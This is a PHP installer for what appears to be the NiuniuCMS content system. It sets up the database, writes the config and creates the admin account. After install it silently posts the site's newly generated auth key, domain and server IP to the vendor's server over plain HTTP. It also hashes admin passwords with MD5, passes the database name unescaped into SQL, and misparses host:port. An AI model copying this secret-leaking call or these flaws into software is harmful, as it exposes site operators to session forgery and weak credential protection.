<?php
define('DEBUG', 2);
define('APP_PATH', realpath(dirname(__FILE__) . '/../') . '/');
define('INSTALL_PATH', dirname(__FILE__) . '/'); 
define('MESSAGE_HTM_PATH', INSTALL_PATH . 'html/message.html');
// Production safety: once installed, installer must stay unreachable from web.
if (PHP_SAPI !== 'cli') {
    $alreadyInstalled = is_file(APP_PATH . 'install.lock') || is_file(APP_PATH . 'config/config.php');
    if ($alreadyInstalled) {
        header('HTTP/1.1 403 Forbidden');
        header('Content-Type: text/plain; charset=utf-8');
        echo '403 Forbidden';
        exit;
    }
}
if (!function_exists('sg_load')){
    include APP_PATH . 'public/html/install_sg.html';
    exit;
}
$conf = (include APP_PATH . 'config/config.default.php');
$conf['log_path'] = APP_PATH .'runtime/log/';
$conf['cache_path'] = APP_PATH . 'runtime/cache/';
include APP_PATH . 'core/core.php';
include APP_PATH . 'model/addons.php';
include APP_PATH . 'model/user.php';
$lang=include APP_PATH . 'lang/zh_cn.php';
$_SERVER['lang'] = $lang;
is_file(APP_PATH . 'install.lock') AND message(0, jump($lang['already_installed'], '../'));
is_file(APP_PATH . 'config/config.php') AND message(0, jump($lang['installed_tips'], '../'));
$action = param('action');
if (empty($action)) {
    if ($method == 'GET') {
       include INSTALL_PATH . "html/index.html"; 
}
}elseif ($action == 'chenk') { 
    $agree = param('agree', 0);
    if (1 != $agree) http_location('index.php'); 
    if ($method == 'GET') {
        $succeed = 1;
        $env = $write = array();
        get_env($env, $write);
        include INSTALL_PATH . "html/chenk.html";
    }
}elseif ($action == 'database') {
    if ($method == 'GET') { 
        $agree = param('agree', 0);
        if (1 != $agree) http_location('index.php'); 
        $succeed = 1; 
        $pdo_mysql_support = extension_loaded('pdo_mysql');
        $myisam_support = extension_loaded('pdo_mysql');
        $innodb_support = extension_loaded('pdo_mysql'); 
        !$pdo_mysql_support AND message(-1, lang('evn_not_support_php_mysql')); 
        include INSTALL_PATH . "html/database.html";
    } else {
        $type = 'pdo_mysql';
        $engine = param('engine');
        $host = param('host');
        $name = param('name');
        $user = param('user');
        $password = param('password');
        $tablepre = param('tablepre');
        $force = param('force');
        $adminemail = param('adminemail');
        $adminuser = param('adminuser');
        $adminpass = param('adminpass');
        $adminpassrepeat = param('adminpassrepeat');
        empty($host) AND message('host', lang('dbhost_is_empty'));
        empty($name) AND message('name', lang('dbname_is_empty'));
        empty($user) AND message('user', lang('dbuser_is_empty'));
        empty($adminpass) AND message('adminpass', lang('adminuser_is_empty'));
        $adminpassrepeat != $adminpass and message('adminpassrepeat', lang('password_incorrect'));
        empty($adminemail) AND message('adminemail', lang('adminpass_is_empty'));
        ini_set('mysql.connect_timeout', 5);
        ini_set('default_socket_timeout', 5);
        $conf['db']['type'] = $type;
        $conf['db']['mysql']['master']['host'] = $host;
        $conf['db']['mysql']['master']['name'] = $name;
        $conf['db']['mysql']['master']['user'] = $user;
        $conf['db']['mysql']['master']['password'] = $password;
        $conf['db']['mysql']['master']['tablepre'] = $tablepre;
        $conf['db']['mysql']['master']['engine'] = $engine;
        $conf['db']['pdo_mysql']['master']['host'] = $host;
        $conf['db']['pdo_mysql']['master']['name'] = $name;
        $conf['db']['pdo_mysql']['master']['user'] = $user;
        $conf['db']['pdo_mysql']['master']['password'] = $password;
        $conf['db']['pdo_mysql']['master']['tablepre'] = $tablepre;
        $conf['db']['pdo_mysql']['master']['engine'] = $engine;
        $pre = $_SERVER['HTTP_HOST'].'_';
        $conf['cache']['memcached']['cachepre'] = $pre;
        $conf['cache']['yac']['cachepre'] = $pre;
        $conf['cache']['mysql']['cachepre'] = $pre;
        $_SERVER['db'] = $db = db_new($conf['db']);
        $r = db_connect($db);
        if (FALSE === $r) {
            if (1049 == $errno || 1045 == $errno) {
                if ($type == 'mysql') {
                    mysql_query("CREATE DATABASE $name");
                    $r = db_connect($db);
                } elseif ('pdo_mysql' == $type) {
                    if (FALSE !== strpos(':', $host)) {
                        $arr = explode(':', $host);
                        $host = $arr[0];
                        $port = $arr[1];
                    } else {
                        $port = 3306;
                    }
                    try {
                        $attr = array(PDO::ATTR_TIMEOUT => 5,);
                        $link = new PDO("mysql:host=$host;port=$port", $user, $password, $attr);
                        $r = $link->exec("CREATE DATABASE `$name`");
                        if ($r === FALSE) {
                            $error = $link->errorInfo();
                            $errno = $error[1];
                            $errstr = $error[2];
                        }
                    } catch (PDOException $e) {
                        $errno = $e->getCode();
                        $errstr = $e->getMessage();
                    }
                }
            }
            if (FALSE === $r) {
                message(-1, "$errstr (errno: $errno)");
            }
        } 
        copy(APP_PATH . 'config/config.default.php', APP_PATH . 'config/config.php'); 
        $replace = array();
        $replace['db'] = $conf['db'];
        $replace['cache'] = $conf['cache'];
        $replace['cookie_pre'] = $tablepre;
        $rand = xn_rand(64);
        $replace['auth_key'] = $rand;
        $replace['installed'] = 1;
        $replace['cms_lang'] = 'zh_cn';
        file_replace_var(APP_PATH . 'config/config.php', $replace); 
        $conf['cache']['mysql']['db'] = $db;  
        $_SERVER['cache'] = $cache = !empty($conf['cache']) ? cache_new($conf['cache']) : NULL;
        // 设置引擎的类型
        if ($engine == 'innodb') {
            $db->innodb_first = TRUE;
        } else {
            $db->innodb_first = FALSE;
        } 
        install_sql_file($tablepre, INSTALL_PATH . 'install.sql'); 
        // 管理员密码
        $salt = xn_rand(16);
        $password = md5(md5($adminpass) . $salt);
        $update = array('username' => $adminuser, 'email' => $adminemail, 'password' => $password, 'salt' => $salt, 'create_date' => $time);
        db_update('user', array('uid' => 1), $update);
         if (filter_var(ip(), FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            $post = array(
                'token' => $rand,
                'host' => _SERVER('HTTP_HOST'), 
                'domain' => _SERVER('REQUEST_SCHEME').'://'._SERVER('HTTP_HOST'), 
                'serverip' =>_SERVER('SERVER_ADDR'),
                );
            $json = https_request('http://niuniucms.com/?cmsinstall.html', $post, '', 500, 1);} 
        file_put_contents(APP_PATH . 'install.lock',  'install_time:'.date('Y-m-d H:i:s'));
        message(0, jump(lang('conguralation_installed'), '../'));
    }
}
function get_env(&$env, &$write)
{
    $env['os']['name'] = lang('os');
    $env['os']['must'] = TRUE;
    $env['os']['current'] = PHP_OS;
    $env['os']['need'] = lang('unix_like');
    $env['os']['status'] = 1; 
    $env['php_version']['name'] = lang('php_version');
    $env['php_version']['must'] = TRUE;
    $env['php_version']['current'] = PHP_VERSION;
    $env['php_version']['need'] = '7.4';
    $env['php_version']['status'] = version_compare(PHP_VERSION, '7.4') > 0; 
    $writedir = array( 
        '../runtime/log/',
        '../runtime/cache/',
        '../upload/',
        '../addons/',
        '../template/'
    ); 
    $write = array();
    foreach ($writedir as &$dir) {
        $write[$dir] = xn_is_writable('./' . $dir);
    }
}
function install_sql_file($tablepre, $sqlfile)
{
    global $errno, $errstr;
    $s = file_get_contents($sqlfile);
    $s = str_replace(";\r\n", ";\n", $s);
    $s = str_replace("`niuniucms_", "`$tablepre", $s);
    $arr = explode(";\n", $s);
    foreach ($arr as $sql) {
        $sql = trim($sql);
        if (empty($sql)) continue;
        FALSE === db_exec($sql) AND message(-1, "sql: $sql, errno: $errno, errstr: $errstr");
    }
}
?>